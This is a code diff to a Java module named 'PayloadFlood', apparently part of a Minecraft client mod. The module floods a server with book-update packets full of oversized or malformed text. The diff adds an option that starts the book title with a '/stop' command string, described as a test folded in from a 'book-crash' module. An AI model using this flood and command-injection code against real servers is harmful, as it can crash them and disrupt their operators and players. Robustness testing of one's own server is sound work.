@@ -64,6 +64,11 @@ public class PayloadFlood extends Module {
         .description("FILLER = plain chars (length test). The rest are content edge cases that pass a length-only sanitizer: zero-width, bidi, Zalgo, lone surrogates, NUL/control, mixed.")
         .defaultValue(Content.FILLER).build()
     );
+    private final Setting<Boolean> titleInjection = sgGeneral.add(new BoolSetting.Builder()
+        .name("title-command-injection")
+        .description("Begin the book title with \"/stop\" to test command-string handling of the title field (folded from book-crash).")
+        .defaultValue(false).build()
+    );
 
     private final TestCadence cadence = new TestCadence(sgGeneral);
     private final PreStress preStress = new PreStress(sgGeneral);
@@ -90,7 +95,7 @@ public class PayloadFlood extends Module {
     @Override
     public void onActivate() {
         ticksActive = 0; packetsSent = 0; bookTurn = true;
-        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
+        cadence.onActivate(); gr.onActivate(this); preStress.onActivate(this);
     }
 
     @EventHandler
@@ -115,8 +120,9 @@ public class PayloadFlood extends Module {
         String page = text(pageSize.get());
         List<String> pages = new ArrayList<>();
         for (int i = 0; i < pagesPerPacket.get(); i++) pages.add(page);
+        Optional<String> title = titleInjection.get() ? Optional.of("/stop" + Math.random() * 400) : Optional.empty();
         mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(
-            mc.player.getInventory().getSelectedSlot(), pages, Optional.empty()));
+            mc.player.getInventory().getSelectedSlot(), pages, title));
             packetsSent++;
     }
 
